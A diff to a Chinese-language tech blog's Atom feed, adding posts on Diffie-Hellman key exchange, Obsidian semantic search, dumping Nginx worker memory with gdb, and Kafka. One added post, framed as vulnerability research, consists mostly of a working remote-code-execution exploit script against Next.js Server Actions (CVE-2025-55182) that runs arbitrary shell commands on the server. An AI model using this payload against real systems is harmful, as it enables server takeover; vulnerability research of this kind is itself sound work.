@@ -3,14 +3,14 @@
     <title>Jason&#39;s tech blog</title>
     <link href="https://hung-jia-jun.github.io/feed.xml" rel="self" >
     <link href="https://hung-jia-jun.github.io" >
-    <updated>2025-12-17T14:51:03Z</updated>
+    <updated>2025-12-17T15:02:38Z</updated>
     <id>https://hung-jia-jun.github.io</id>
         <entry>
             <title>
                 技術筆記
                 
             </title>
-            <updated>2025-12-17T14:50:55Z</updated>
+            <updated>2025-12-17T15:02:21Z</updated>
             <id>https://hung-jia-jun.github.io/</id>
             <content type="html">
                 &lt;p&gt;just 技術筆記&lt;/p&gt;
@@ -20,10 +20,226 @@
         </entry>
         <entry>
             <title>
+                密碼學 - 零知識證明 - 密鑰協商
+                
+            </title>
+            <updated>2025-12-17T15:02:21Z</updated>
+            <id>https://hung-jia-jun.github.io/技術文件/密碼學 - 零知識證明 - 密鑰協商/</id>
+            <content type="html">
+                &lt;img src=&quot;https://www.plantuml.com/plantuml/svg/SoWkIImgAStDuNA0inAJI_AB51npCfDJeMod_2GkBbjRXQUjQrvEwtxQt_niwWu5Mriki1e5NJkG0WKhgBH2WOv2keB6qoNBNsnU1LJuegFz-PJvppecF6rjrWGRytBsp6VJTZwViWWe_dnvuyk96u1ge6Otx44n6CAmKdZPkEFPvFQNirOyMmdLef28RltpcNjUDZGgE2hOAcYaQsabQYgeAXHmWUJWIh0OamHJ0RCAQemJr9WaY348TxzOqV5ytVIdhHkVx5hzT7qRo0niBlO6wNV2xWomd2F2xBpyabI5eipqZ18hME00RMZVzNnM2r3jipdDpsVlU3gXXyiXDIy575SG6W00&quot; alt=&quot;uml diagram&quot; /&gt;
+&lt;h1 id=&quot;diffie-hellman&quot; tabindex=&quot;-1&quot;&gt;範例程式(Diffie-Hellman 方法)&lt;/h1&gt;
+&lt;p&gt;讓我們用密碼學最常用的人名 Bob 與 Alice 舉例&lt;/p&gt;
+&lt;p&gt;Bob 端&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;import random
+# Diffie-Hellman
+p = 23 # 公開參數
+g = 5 # 公開參數
+
+bob_private = random.randint(1, p-1)
+bob_public = (g ** bob_private) % p  # 2
+print(&amp;quot;Bob 的公開值：&amp;quot;, bob_public)
+
+alice_public = int(input(&amp;quot;請輸入 Alice 的公開值: &amp;quot;))
+bob_shared = (alice_public ** bob_private) % p
+print(&amp;quot;Bob 計算的共享密鑰：&amp;quot;, bob_shared)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Alice 端&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;import random
+p = 23 # 公開參數
+g = 5 # 公開參數
+
+alice_private = random.randint(1, p-1)
+alice_public = (g ** alice_private) % p  # 8
+print(&amp;quot;Alice 的公開值：&amp;quot;, alice_public)
+
+bob_public = int(input(&amp;quot;請輸入 Bob 的公開值: &amp;quot;))
+alice_shared = (bob_public ** alice_private) % p
+print(&amp;quot;Alice 計算的共享密鑰：&amp;quot;, alice_shared)
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;只要輸入對方的公開數，就能計算出共享密鑰&lt;br /&gt;
+&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020250717223215.png&quot; alt=&quot;Pasted image 20250717223215.png&quot; /&gt;&lt;/p&gt;
+&lt;h1 id=&quot;重放攻擊&quot; tabindex=&quot;-1&quot;&gt;重放攻擊&lt;/h1&gt;
+&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;# Eve 已知 g, p, alice_public
+p = 23 # 公開參數
+g = 5 # 公開參數
+alice_public = 12
+
+# Eve 嘗試所有可能的私鑰
+for possible_private in range(1, p):
+    if (g ** possible_private) % p == alice_public:
+        print(&amp;quot;Alice 的私鑰是：&amp;quot;, possible_private)
+        break
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&quot;離散對數問題&quot; tabindex=&quot;-1&quot;&gt;離散對數問題&lt;/h2&gt;
+&lt;p&gt;在正常情況下，Eve（攻擊者）無法輕易算出 Alice 的私鑰，這正是 Diffie-Hellman 密鑰交換的安全基礎。&lt;br /&gt;
+原因如下：&lt;br /&gt;
+Alice 的公開值是：alice_public = (g ** alice_private) % p&lt;br /&gt;
+Eve 想要知道 alice_private，必須解「離散對數問題」：已知 g、p、alice_public，求 alice_private&lt;br /&gt;
+這個問題在大質數下是非常困難的（目前沒有有效的演算法），所以只要 p 夠大，Alice 的私鑰就很安全&lt;br /&gt;
+但如果 p 很小（像教學範例 p=23），Eve 可以用暴力法：&lt;/p&gt;
+&lt;p&gt;這種方法只適用於 p 很小的情況。&lt;br /&gt;
+實務上 p 至少要 2048 位元，這樣 Eve 幾乎不可能算出 Alice 的私鑰。&lt;br /&gt;
+總結：&lt;br /&gt;
+p 小時，Eve 可以暴力破解 Alice 的私鑰&lt;br /&gt;
+p 夠大時，Eve 幾乎不可能算出 Alice 的私鑰&lt;br /&gt;
+這就是 Diffie-Hellman 的安全基礎&lt;/p&gt;
+&lt;h1 id=&quot;安全質數&quot; tabindex=&quot;-1&quot;&gt;安全質數&lt;/h1&gt;
+&lt;p&gt;選用夠大的「安全質數」可以防止離散對數被暴力攻擊&lt;br /&gt;
+&lt;a href=&quot;https://datatracker.ietf.org/doc/html/rfc3526#section-2&quot; target=&quot;_blank&quot; class=&quot;external-link&quot;&gt;https://datatracker.ietf.org/doc/html/rfc3526#section-2&lt;/a&gt;&lt;/p&gt;
+
+            </content>
+            <link href="https://hung-jia-jun.github.io/技術文件/密碼學 - 零知識證明 - 密鑰協商/" >
+        </entry>
+        <entry>
+            <title>
+                安裝 Obsidian 語意搜尋套件
+                
+            </title>
+            <updated>2025-12-17T15:02:21Z</updated>
+            <id>https://hung-jia-jun.github.io/技術文件/安裝 Obsidian 語意搜尋套件/</id>
+            <content type="html">
+                &lt;p&gt;Plugin repo: &lt;a href=&quot;https://github.com/bbawj/obsidian-semantic-search?tab=readme-ov-file#demo&quot; target=&quot;_blank&quot; class=&quot;external-link&quot;&gt;https://github.com/bbawj/obsidian-semantic-search?tab=readme-ov-file#demo&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;在 Settings -&amp;gt; Community plugins -&amp;gt; Browse&lt;br /&gt;
+&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251217181636.png&quot; alt=&quot;Pasted image 20251217181636.png&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;搜尋 Semantic Search&lt;br /&gt;
+&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251217181747.png&quot; alt=&quot;Pasted image 20251217181747.png&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;安裝套件&lt;br /&gt;
+&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251217181834.png&quot; alt=&quot;Pasted image 20251217181834.png&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;啟用 Semantic 套件&lt;br /&gt;
+&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251217181933.png&quot; alt=&quot;Pasted image 20251217181933.png&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;安裝 ollama&lt;br /&gt;
+&lt;a href=&quot;https://ollama.com/download&quot; target=&quot;_blank&quot; class=&quot;external-link&quot;&gt;https://ollama.com/download&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;下載 embeding model&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;ollama pull nomic-embed-text  
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;檢查 model 是否有安裝成功&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;$ ollama list
+NAME                       ID              SIZE      MODIFIED   
+nomic-embed-text:latest    0a109f422b47    274 MB    About an hour ago    
+&lt;/code&gt;&lt;/pre&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;參數名稱&lt;/th&gt;
+&lt;th&gt;設定值&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;API URL&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;http://localhost:11434/api/embed&lt;/code&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Model&lt;/td&gt;
+&lt;td&gt;nomic-embed-text&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;設定參數&lt;br /&gt;
+&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251217182540.png&quot; alt=&quot;Pasted image 20251217182540.png&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;打開 command palette&lt;br /&gt;
+&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251217182721.png&quot; alt=&quot;Pasted image 20251217182721.png&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;按照以下順序執行&lt;br /&gt;
+&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251217182834.png&quot; alt=&quot;Pasted image 20251217182834.png&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;之後就可以用這個進行語意搜尋&lt;br /&gt;
+&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251217183031.png&quot; alt=&quot;Pasted image 20251217183031.png&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;整體語意搜尋結果還不錯&lt;br /&gt;
+&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251217183146.png&quot; alt=&quot;Pasted image 20251217183146.png&quot; /&gt;&lt;/p&gt;
+&lt;h1 id=&quot;總結&quot; tabindex=&quot;-1&quot;&gt;總結&lt;/h1&gt;
+&lt;p&gt;透過這個 obsidian 工具，可以做到語意級別的模糊搜尋，有時候可能就是模糊的感覺，沒有明確的關鍵字，就可以考慮用這個搜尋工具進行搜尋。&lt;/p&gt;
+
+            </content>
+            <link href="https://hung-jia-jun.github.io/技術文件/安裝 Obsidian 語意搜尋套件/" >
+        </entry>
+        <entry>
+            <title>
+                使用 pmap、smaps 與 gdb Dump 出 Nginx Worker 記憶體區段教學
+                
+            </title>
+            <updated>2025-12-17T15:02:21Z</updated>
+            <id>https://hung-jia-jun.github.io/技術文件/使用 pmap、smaps 與 gdb Dump 出 Nginx Worker 記憶體區段教學/</id>
+            <content type="html">
+                &lt;h1 id=&quot;主旨&quot; tabindex=&quot;-1&quot;&gt;主旨&lt;/h1&gt;
+&lt;pre&gt;&lt;code&gt;本教學示範如何透過 Linux 的 pmap、/proc/&amp;lt;pid&amp;gt;/smaps 與 gdb 取得指定 process 的匿名記憶體區段，並導出成 dump 檔供後續分析。
+&lt;/code&gt;&lt;/pre&gt;
+&lt;hr /&gt;
+&lt;h2 id=&quot;0-nginx-process&quot; tabindex=&quot;-1&quot;&gt;0. 找出 nginx process&lt;/h2&gt;
+&lt;p&gt;&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251110210252.png&quot; alt=&quot;Pasted image 20251110210252.png&quot; /&gt;&lt;/p&gt;
+&lt;h2 id=&quot;1&quot; tabindex=&quot;-1&quot;&gt;1. 找出記憶體佔用最高的區段&lt;/h2&gt;
+&lt;p&gt;首先使用 pmap 檢查 Nginx worker 的 memory map，並依 RSS 由大到小排序：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;$ pmap -x 135 | sort -k 3 -n -r | head -3
+total kB         2709340  412896  407496
+00007fe347600000  468992  393644  393644 rw---   [ anon ]
+00007fe3423ee000    5632    3860    3860 rw---   [ anon ]
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;重點：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;RSS&lt;/code&gt; 欄位表示實際佔用的實體記憶體。&lt;/li&gt;
+&lt;li&gt;第一筆最大者：&lt;code&gt;00007fe347600000&lt;/code&gt;，RSS 約 393MB。&lt;/li&gt;
+&lt;li&gt;標記為 &lt;code&gt;[ anon ]&lt;/code&gt;，通常代表匿名 mmap 或 GC heap、buffer、cache 等。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr /&gt;
+&lt;h2 id=&quot;2-smaps&quot; tabindex=&quot;-1&quot;&gt;2. 用 smaps 確認該地址區段的完整範圍&lt;/h2&gt;
+&lt;p&gt;pmap 顯示的是區段起始地址，但實際區段長度需從 smaps 查詢。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;$ cat /proc/135/smaps | grep 7fe347600000
+7fe34296e000-7fe347600000 r--s 00000000 00:36 2640400 /data/nginx/ip2proxy/PX2_CUSTOMER.mmdb
+7fe347600000-7fe364000000 rw-p 00000000 00:00 0
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;解讀：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;第一段：&lt;code&gt;7fe34296e000-7fe347600000&lt;/code&gt; 是 memory-mapped file (&lt;code&gt;PX2_CUSTOMER.mmdb&lt;/code&gt;)&lt;/li&gt;
+&lt;li&gt;第二段：&lt;code&gt;7fe347600000-7fe364000000&lt;/code&gt; 是匿名記憶體 (&lt;code&gt;rw-p ... 0&lt;/code&gt;)&lt;br /&gt;
+這就是 pmap 顯示為 &lt;code&gt;[ anon ]&lt;/code&gt; 的那一段。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;因此要 dump 的實際區段範圍為：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;start: 0x7fe347600000 
+end:   0x7fe364000000
+&lt;/code&gt;&lt;/pre&gt;
+&lt;hr /&gt;
+&lt;h2 id=&quot;3-gdb-attach&quot; tabindex=&quot;-1&quot;&gt;3. 使用 gdb attach 進程&lt;/h2&gt;
+&lt;p&gt;進入 gdb：&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;$ gdb -pid 135&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;若出現權限問題，需確認：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;容器需加上 &lt;code&gt;--cap-add=SYS_PTRACE --security-opt seccomp=unconfined&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;或需在宿主機設置 &lt;code&gt;kernel.yama.ptrace_scope=0&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr /&gt;
+&lt;h2 id=&quot;4-gdb-dump&quot; tabindex=&quot;-1&quot;&gt;4. 在 gdb 裡 dump 出記憶體檔案&lt;/h2&gt;
+&lt;p&gt;進入 gdb 之後，執行：&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;(gdb) dump memory /tmp/memdump_1 0x7fe347600000 0x7fe364000000&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;說明：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;code&gt;/tmp/memdump_1&lt;/code&gt; 為輸出檔案路徑&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;開始地址與結束地址對應 smaps 的匿名記憶體範圍&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;假如 dump 成功，會在 &lt;code&gt;/tmp&lt;/code&gt; 看到數百 MB 至數 GB 的檔案。&lt;/p&gt;
+&lt;hr /&gt;
+&lt;h2 id=&quot;5-dump&quot; tabindex=&quot;-1&quot;&gt;5. 後續分析 dump 檔案&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;讀取可見字串：&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;code&gt;$ strings /tmp/memdump_1 | less&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251110210134.png&quot; alt=&quot;Pasted image 20251110210134.png&quot; /&gt;&lt;/p&gt;
+
+            </content>
+            <link href="https://hung-jia-jun.github.io/技術文件/使用 pmap、smaps 與 gdb Dump 出 Nginx Worker 記憶體區段教學/" >
+        </entry>
+        <entry>
+            <title>
                 kafka 高效率傳輸設定
                 
             </title>
-            <updated>2025-12-17T14:50:55Z</updated>
+            <updated>2025-12-17T15:02:21Z</updated>
             <id>https://hung-jia-jun.github.io/技術文件/apache_kafka/kafka 高效率傳輸設定/</id>
             <content type="html">
                 &lt;p&gt;訂閱 kafka 消息&lt;/p&gt;
@@ -66,7 +282,7 @@
                 Consumer offset reset 行為
                 
             </title>
-            <updated>2025-12-17T14:50:55Z</updated>
+            <updated>2025-12-17T15:02:21Z</updated>
             <id>https://hung-jia-jun.github.io/技術文件/apache_kafka/Consumer offset reset 行為/</id>
             <content type="html">
                 &lt;h1 id=&quot;情境&quot; tabindex=&quot;-1&quot;&gt;情境&lt;/h1&gt;
@@ -164,5 +380,58 @@ try(openSearchClient; consumer){
 
             </content>
             <link href="https://hung-jia-jun.github.io/技術文件/apache_kafka/Consumer offset reset 行為/" >
+        </entry>
+        <entry>
+            <title>
+                CVE-2025-55182 漏洞研究
+                
+            </title>
+            <updated>2025-12-17T15:02:21Z</updated>
+            <id>https://hung-jia-jun.github.io/技術文件/CVE-2025-55182 漏洞研究/</id>
+            <content type="html">
+                &lt;pre&gt;&lt;code&gt;npm create next-app@16.0.6
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;cd my-app/
+npm run dev
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;打開 &lt;code&gt;http://localhost:3000&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;攻擊程式&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;# refrence: https://github.com/msanft/CVE-2025-55182
+
+import requests
+import sys
+import json
+
+BASE_URL = sys.argv[1] if len(sys.argv) &amp;gt; 1 else &amp;quot;http://localhost:3000&amp;quot;
+EXECUTABLE = sys.argv[2] if len(sys.argv) &amp;gt; 2 else &amp;quot;id&amp;quot;
+
+crafted_chunk = {
+    &amp;quot;then&amp;quot;: &amp;quot;$1:__proto__:then&amp;quot;,
+    &amp;quot;status&amp;quot;: &amp;quot;resolved_model&amp;quot;,
+    &amp;quot;reason&amp;quot;: -1,
+    &amp;quot;value&amp;quot;: &#39;{&amp;quot;then&amp;quot;: &amp;quot;$B0&amp;quot;}&#39;,
+    &amp;quot;_response&amp;quot;: {
+        &amp;quot;_prefix&amp;quot;: f&amp;quot;var res = process.mainModule.require(&#39;child_process&#39;).execSync(&#39;{EXECUTABLE}&#39;,{{&#39;timeout&#39;:5000}}).toString().trim(); throw Object.assign(new Error(&#39;NEXT_REDIRECT&#39;), {{digest:`${{res}}`}});&amp;quot;,
+        # If you don&#39;t need the command output, you can use this line instead:
+        # &amp;quot;_prefix&amp;quot;: f&amp;quot;process.mainModule.require(&#39;child_process&#39;).execSync(&#39;{EXECUTABLE}&#39;);&amp;quot;,
+        &amp;quot;_formData&amp;quot;: {
+            &amp;quot;get&amp;quot;: &amp;quot;$1:constructor:constructor&amp;quot;,
+        },
+    },
+}
+
+files = {
+    &amp;quot;0&amp;quot;: (None, json.dumps(crafted_chunk)),
+    &amp;quot;1&amp;quot;: (None, &#39;&amp;quot;$@0&amp;quot;&#39;),
+}
+
+headers = {&amp;quot;Next-Action&amp;quot;: &amp;quot;x&amp;quot;}
+res = requests.post(BASE_URL, files=files, headers=headers, timeout=10)
+print(res.status_code)
+print(res.text)
+&lt;/code&gt;&lt;/pre&gt;
+
+            </content>
+            <link href="https://hung-jia-jun.github.io/技術文件/CVE-2025-55182 漏洞研究/" >
         </entry>
 </feed>
